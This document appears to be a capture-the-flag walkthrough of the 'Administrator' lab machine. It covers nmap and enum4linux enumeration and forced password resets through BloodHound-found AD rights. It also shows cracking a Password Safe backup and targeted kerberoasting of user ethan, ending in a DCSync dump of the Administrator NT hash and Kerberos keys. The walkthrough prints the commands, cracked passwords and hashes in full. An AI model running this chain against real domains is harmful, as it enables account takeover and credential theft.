nmap output:
```bash
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-08 06:19:05Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
```

enum4linux as olivia output:
```bash
 ==========================================
|    Listener Scan on administrator.htb    |
 ==========================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 =========================================================
|    Domain Information via LDAP for administrator.htb    |
 =========================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: administrator.htb

 ==============================================
|    SMB Dialect Check on administrator.htb    |
 ==============================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:
  SMB 1.0: false
  SMB 2.02: true
  SMB 2.1: true
  SMB 3.0: true
  SMB 3.1.1: true
Preferred dialect: SMB 3.0
SMB1 only: false
SMB signing required: true

 ================================================================
|    Domain Information via SMB session for administrator.htb    |
 ================================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: DC
NetBIOS domain name: ADMINISTRATOR
DNS domain: administrator.htb
FQDN: dc.administrator.htb
Derived membership: domain member
Derived domain: ADMINISTRATOR

 ========================================================
|    Domain Information via RPC for administrator.htb    |
 ========================================================
[+] Domain: ADMINISTRATOR
[+] Domain SID: S-1-5-21-1088858960-373806567-254189436
[+] Membership: domain member

 ====================================================
|    OS Information via RPC for administrator.htb    |
 ====================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[+] Found OS information via 'srvinfo'
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016
OS version: '10.0'
OS release: ''
OS build: '20348'
Native OS: not supported
Native LAN manager: not supported
Platform id: '500'
Server type: '0x80102b'
Server type string: Sv PDC Tim NT

 ==========================================
|    Users via RPC on administrator.htb    |
 ==========================================
[*] Enumerating users via 'querydispinfo'
[+] Found 10 user(s) via 'querydispinfo'
[*] Enumerating users via 'enumdomusers'
[+] Found 10 user(s) via 'enumdomusers'
[+] After merging user results we have 10 user(s) total:
'1108':
  username: olivia
  name: Olivia Johnson
  acb: '0x00000214'
  description: (null)
'1109':
  username: michael
  name: Michael Williams
  acb: '0x00000210'
  description: (null)
'1110':
  username: benjamin
  name: Benjamin Brown
  acb: '0x00000210'
  description: (null)
'1112':
  username: emily
  name: Emily Rodriguez
  acb: '0x00000210'
  description: (null)
'1113':
  username: ethan
  name: Ethan Hunt
  acb: '0x00000210'
  description: (null)
'3601':
  username: alexander
  name: Alexander Smith
  acb: '0x00000211'
  description: (null)
'3602':
  username: emma
  name: Emma Johnson
  acb: '0x00000211'
  description: (null)
'500':
  username: Administrator
  name: (null)
  acb: '0x00000210'
  description: Built-in account for administering the computer/domain
'501':
  username: Guest
  name: (null)
  acb: '0x00000215'
  description: Built-in account for guest access to the computer/domain
'502':
  username: krbtgt
  name: (null)
  acb: '0x00020011'
  description: Key Distribution Center Service Account

 ===========================================
|    Groups via RPC on administrator.htb    |
 ===========================================
[*] Enumerating local groups
[+] Found 6 group(s) via 'enumalsgroups domain'
[*] Enumerating builtin groups
[+] Found 28 group(s) via 'enumalsgroups builtin'
[*] Enumerating domain groups
[+] Found 15 group(s) via 'enumdomgroups'
[+] After merging groups results we have 49 group(s) total:
'1101':
  groupname: DnsAdmins
  type: local
'1102':
  groupname: DnsUpdateProxy
  type: domain
'1111':
  groupname: Share Moderators
  type: local
'498':
  groupname: Enterprise Read-only Domain Controllers
  type: domain
'512':
  groupname: Domain Admins
  type: domain
'513':
  groupname: Domain Users
  type: domain
'514':
  groupname: Domain Guests
  type: domain
'515':
  groupname: Domain Computers
  type: domain
'516':
  groupname: Domain Controllers
  type: domain
'517':
  groupname: Cert Publishers
  type: local
'518':
  groupname: Schema Admins
  type: domain
'519':
  groupname: Enterprise Admins
  type: domain
'520':
  groupname: Group Policy Creator Owners
  type: domain
'521':
  groupname: Read-only Domain Controllers
  type: domain
'522':
  groupname: Cloneable Domain Controllers
  type: domain
'525':
  groupname: Protected Users
  type: domain
'526':
  groupname: Key Admins
  type: domain
'527':
  groupname: Enterprise Key Admins
  type: domain
'544':
  groupname: Administrators
  type: builtin
'545':
  groupname: Users
  type: builtin
'546':
  groupname: Guests
  type: builtin
'548':
  groupname: Account Operators
  type: builtin
'549':
  groupname: Server Operators
  type: builtin
'550':
  groupname: Print Operators
  type: builtin
'551':
  groupname: Backup Operators
  type: builtin
'552':
  groupname: Replicator
  type: builtin
'553':
  groupname: RAS and IAS Servers
  type: local
'554':
  groupname: Pre-Windows 2000 Compatible Access
  type: builtin
'555':
  groupname: Remote Desktop Users
  type: builtin
'556':
  groupname: Network Configuration Operators
  type: builtin
'557':
  groupname: Incoming Forest Trust Builders
  type: builtin
'558':
  groupname: Performance Monitor Users
  type: builtin
'559':
  groupname: Performance Log Users
  type: builtin
'560':
  groupname: Windows Authorization Access Group
  type: builtin
'561':
  groupname: Terminal Server License Servers
  type: builtin
'562':
  groupname: Distributed COM Users
  type: builtin
'568':
  groupname: IIS_IUSRS
  type: builtin
'569':
  groupname: Cryptographic Operators
  type: builtin
'571':
  groupname: Allowed RODC Password Replication Group
  type: local
'572':
  groupname: Denied RODC Password Replication Group
  type: local
'573':
  groupname: Event Log Readers
  type: builtin
'574':
  groupname: Certificate Service DCOM Access
  type: builtin
'575':
  groupname: RDS Remote Access Servers
  type: builtin
'576':
  groupname: RDS Endpoint Servers
  type: builtin
'577':
  groupname: RDS Management Servers
  type: builtin
'578':
  groupname: Hyper-V Administrators
  type: builtin
'579':
  groupname: Access Control Assistance Operators
  type: builtin
'580':
  groupname: Remote Management Users
  type: builtin
'582':
  groupname: Storage Replica Administrators
  type: builtin

 ===========================================
|    Shares via RPC on administrator.htb    |
 ===========================================
[*] Enumerating shares
[+] Found 5 share(s):
ADMIN$:
  comment: Remote Admin
  type: Disk
C$:
  comment: Default share
  type: Disk
IPC$:
  comment: Remote IPC
  type: IPC
NETLOGON:
  comment: Logon server share
  type: Disk
SYSVOL:
  comment: Logon server share
  type: Disk
[*] Testing share ADMIN$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share C$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share IPC$
[+] Mapping: OK, Listing: NOT SUPPORTED
[*] Testing share NETLOGON
[-] Could not parse result of smbclient command, please open a GitHub issue
[*] Testing share SYSVOL
[-] Could not parse result of smbclient command, please open a GitHub issue

 ==============================================
|    Policies via RPC for administrator.htb    |
 ==============================================
[*] Trying port 445/tcp
[+] Found policy:
Domain password information:
  Password history length: 24
  Minimum password length: 7
  Maximum password age: 41 days 23 hours 53 minutes
  Password properties:
  - DOMAIN_PASSWORD_COMPLEX: false
  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false
  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false
  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false
  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false
  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false
Domain lockout information:
  Lockout observation window: 30 minutes
  Lockout duration: 30 minutes
  Lockout threshold: None
Domain logoff information:
  Force logoff time: not set
```

evil-winrm as olivia output:
```bash
*Evil-WinRM* PS C:\Users\olivia> ls

    Directory: C:\Users\olivia

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---          5/8/2021   1:20 AM                Desktop
d-r---         12/7/2024  10:46 PM                Documents
d-r---          5/8/2021   1:20 AM                Downloads
d-r---          5/8/2021   1:20 AM                Favorites
d-r---          5/8/2021   1:20 AM                Links
d-r---          5/8/2021   1:20 AM                Music
d-r---          5/8/2021   1:20 AM                Pictures
d-----          5/8/2021   1:20 AM                Saved Games
d-r---          5/8/2021   1:20 AM                Videos

*Evil-WinRM* PS C:\Users\olivia> cd ..
*Evil-WinRM* PS C:\Users> ls

    Directory: C:\Users

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        10/22/2024  11:46 AM                Administrator
d-----        10/30/2024   2:25 PM                emily
d-----         12/7/2024  11:00 PM                olivia
d-r---         10/4/2024  10:08 AM                Public
```

bloodhound generic all on user michael from user olivia:
![image](https://github.com/user-attachments/assets/9fa0fa4a-94ee-4ba1-8475-c58014d74e73)

since generic all, try changing michael password directly:
```bash
*Evil-WinRM* PS C:\Users\olivia> $newpass = ConvertTo-SecureString "YourNewPassword123!" -AsPlainText -Force
*Evil-WinRM* PS C:\Users\olivia> Set-ADAccountPassword -Identity michael -NewPassword $newpass -Server administrator.htb -Verbose
Verbose: Performing the operation "Set-ADAccountPassword" on target "CN=Michael Williams,CN=Users,DC=administrator,DC=htb".
```

bloodhound force change password on user benjamin from user michael:
![image](https://github.com/user-attachments/assets/fa41c00a-6e35-4b20-9136-db97005f2465)

connect as michael since we changed password and force change password for user benjamin:
```bash
*Evil-WinRM* PS C:\Users\michael\Documents> $newpass = ConvertTo-SecureString "YourNewPassword123!" -AsPlainText -Force
*Evil-WinRM* PS C:\Users\michael\Documents> Set-ADAccountPassword -Identity benjamin -Reset -NewPassword $NewPass -Verbose
Verbose: Performing the operation "Set-ADAccountPassword" on target "CN=Benjamin Brown,CN=Users,DC=administrator,DC=htb".
```

ftp as benjamin:
```bash
Connected to administrator.htb.
220 Microsoft FTP Service
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||50635|)
150 Opening ASCII mode data connection.
10-05-24  08:13AM                  952 Backup.psafe3
226 Transfer complete.
ftp> get Backup.psafe3
local: Backup.psafe3 remote: Backup.psafe3
229 Entering Extended Passive Mode (|||50636|)
125 Data connection already open; Transfer starting.
100% |**********************************************************************************************************************************|   952       29.17 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 3 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
952 bytes received in 00:00 (28.69 KiB/s)
ftp> exit
221 Goodbye.
```

hashcat psafe3 file output (tekieromucho):
```bash
Backup.psafe3:tekieromucho                                
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5200 (Password Safe v3)
Hash.Target......: Backup.psafe3
Time.Started.....: Sun Dec  8 06:02:17 2024 (1 sec)
Time.Estimated...: Sun Dec  8 06:02:18 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#2.........:     7940 H/s (9.44ms) @ Accel:64 Loops:1024 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4864/14344384 (0.03%)
Rejected.........: 0/4864 (0.00%)
Restore.Point....: 4608/14344384 (0.03%)
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:2048-2049
Candidate.Engine.: Device Generator
Candidates.#2....: terminator -> daryl

```

psafe3 file output:
![image](https://github.com/user-attachments/assets/4d0de26c-1878-462d-ae34-f1ee0d9d9cd6)
- alexander: `UrkIbagoxMyUGw0aPlj9B0AXSea4Sw`
- emily: `UXLCI5iETUsIBoFVTj8yQFKoHjXmb`
- emma: `WwANQWnmJnGV07WQN8bMS7FMAbjNur`

bloodhound generic write on user ethan from user emily:
![image](https://github.com/user-attachments/assets/e15de180-ee85-4b8c-b790-ea2a7af93c9f)

user flag:
```bash
*Evil-WinRM* PS C:\Users\emily\Documents> cd ..
*Evil-WinRM* PS C:\Users\emily> cd Desktop
*Evil-WinRM* PS C:\Users\emily\Desktop> ls


    Directory: C:\Users\emily\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/30/2024   2:23 PM           2308 Microsoft Edge.lnk
-ar---         12/7/2024  10:07 PM             34 user.txt


*Evil-WinRM* PS C:\Users\emily\Desktop> download user.txt
                                        
Info: Downloading C:\Users\emily\Desktop\user.txt to user.txt
                                        
Info: Download successful!
```
set SPN on user ethan for kerberoasting:
```bash
*Evil-WinRM* PS C:\Users\emily\Documents> Get-ADUser ethan


DistinguishedName : CN=Ethan Hunt,CN=Users,DC=administrator,DC=htb
Enabled           : True
GivenName         : Ethan
Name              : Ethan Hunt
ObjectClass       : user
ObjectGUID        : 1a62f8b3-a5dd-4d55-8b37-464a32825662
SamAccountName    : ethan
SID               : S-1-5-21-1088858960-373806567-254189436-1113
Surname           : Hunt
UserPrincipalName : ethan@administrator.htb



*Evil-WinRM* PS C:\Users\emily\Documents> Set-ADObject -Identity "CN=Ethan Hunt,CN=Users,DC=administrator,DC=htb" -Add @{servicePrincipalName="fake9/service9"}
*Evil-WinRM* PS C:\Users\emily\Documents> Get-ADUser ethan -Properties ServicePrincipalName


DistinguishedName    : CN=Ethan Hunt,CN=Users,DC=administrator,DC=htb
Enabled              : True
GivenName            : Ethan
Name                 : Ethan Hunt
ObjectClass          : user
ObjectGUID           : 1a62f8b3-a5dd-4d55-8b37-464a32825662
SamAccountName       : ethan
ServicePrincipalName : {fake9/service9}
SID                  : S-1-5-21-1088858960-373806567-254189436-1113
Surname              : Hunt
UserPrincipalName    : ethan@administrator.htb
```

crack kerberos ticket with hashcat output:
```bash
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$0cca4541f5b4b69f5f11b98c5dafdfe2$33a6d6cce19b1f7e9e541dd57dc47fdad588f7a139807348923c13d1c99b0c9f905cb9bb02c03cc58d7ca5c24bdcce8f7f0b5f6fa847ba84b7f1c4cee255245448e41e0c4041a9fa822b5ec36cb0d324170e71ddd711e5606aff9324ecbab5bb9e4d156b0811ad23121e34a2ed6a670f3248a6718ac2ea08a48cb12cf31f92f8887dc6c10e55507488c8adf4192efce7ded3f7dc58ca83408723fd2e5e131bb0e4334070bd547b3897b1125ee4f249cd617653ac5ca1048851cef9fe084e5185640bf3e6a5d8f2d7b465fbf0ac069283da637ecb17df0f00beebac8906382b78253f283e56ff6f7802cb8ad237cb9c38daa363d7414fe1a176b50b74ab01e618142052f3c433f5a0fe2b37db23b3a6ed8c302682f08dc5e3ee31cf6ef308c344a7ed37ec5313ec5f651b67f1c95f1b6f0c04b0692ab6c6a16a01677597defc0054bb3ca50436367c7cdf3cf6aee8a224d0cc1713fff9ab9786d4febec95aec99b33ee085dd81a0d55a21a9dcade3ace48a92facc78efd0924a5392ced6ecd894dc4d25196d9b37593f1a5ba58160a773078dbe8f4ef4c8278397e0fc7f9496c2c51c544460279c090acc4565839079ac2f5c3b89068f505cdc92fed830a737e1db4b68842d83d64948aaef89ce44cc2f91fb5ed6ea341155dbfb21491cdd5028aa29923648e92dfb3c4fa4371df32e8e3431e6011be2d1084b241f22cced0e05e88701a4099e12bcaf92c250e8d294efd5e5363a78eaacb93985d81e9a60e4bcf28bcdcfac0c4da06bd78a3d171ab82ca01d9fa21364ae0056aa7cf585fd68608c8864e58ce28075ce829dc0e2e0dac6112b9be3c9119ddb1f500c5665fe46a4b0426d414ae48225d4d47ae7c51eaf89ddb7bc964e102e7f4316ba9bc542bda1d39bd0f09ede0a6d9ecf65e7f4ce16043765f21cbe677edf7c5007627d6eb0515046a5b6e91dc226c7a414cf84a3465e0524e3ab6e5b1b602c46b3a7f2272bffd887c99b3e9efc5e9c2934296e3b36911f3828d9ecdf639384b4c76b94587705fef41fb4aafc124b9cea3fc32ab515e93c9bc1c70ba6f5a4013728ba2e341aa9baaeabf74ef64e8af8d9a418ac1d1e19b72f1d1e693b26880329c9ffacb317517d6ff302c66a0da098d05f7418bce21c6eb480c5a8abd44b25a60c404f61c8c5ff27bd030a5519cef56656f2ba4c36b69976db808d6fdcc0c5b79bcf98dd66011ba81adcb000fd3ccd6181a6f81b8fda092a55154e58810b592078cfb6e8567f4fb5fa17604b1cc591b9fc845a430840bb259de2dc6f43cc3fb66034a45bab227697cf998492c8a96ef9d684dcae4ca9d06986f2ccff875f5611c6d94a418099a25fab4a238ad671c2f0f22aa5e7e296fe249e858b445ca5211d0b47ee8e46104ba8eae965960703d8e53bb2c2b2666acfe10fb6a25d72bf8f171cec3795a08a301393803a6c0edd1dd323b3eb78e5eaa49f1efea71b0e6f20acf0939eb594f4fadb338b87771277d71578a045a4a1b53dfaf8f5d9dc9523f00ecce484875a:limpbizkit
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator....84875a
Time.Started.....: Sun Dec  8 01:06:12 2024 (0 secs)
Time.Estimated...: Sun Dec  8 01:06:12 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (./rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  5189.4 kH/s (1.79ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 16384/14344384 (0.11%)
Rejected.........: 0/16384 (0.00%)
Restore.Point....: 0/14344384 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> christal
Hardware.Mon.#1..: Temp: 44c Util:  9%
```

bloodhound dc sync for user ethan:
![image](https://github.com/user-attachments/assets/a8e4485f-0382-4e8c-a531-e607733637dd)

get password hash for admin:
```bash
└──╼ [★]$ impacket-secretsdump administrator.htb/ethan@10.129.96.179 -just-dc-user Administrator
Impacket v0.13.0.dev0+20240916.171021.65b774d - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
Administrator:des-cbc-md5:403286f7cdf18385
[*] Cleaning up... 
```
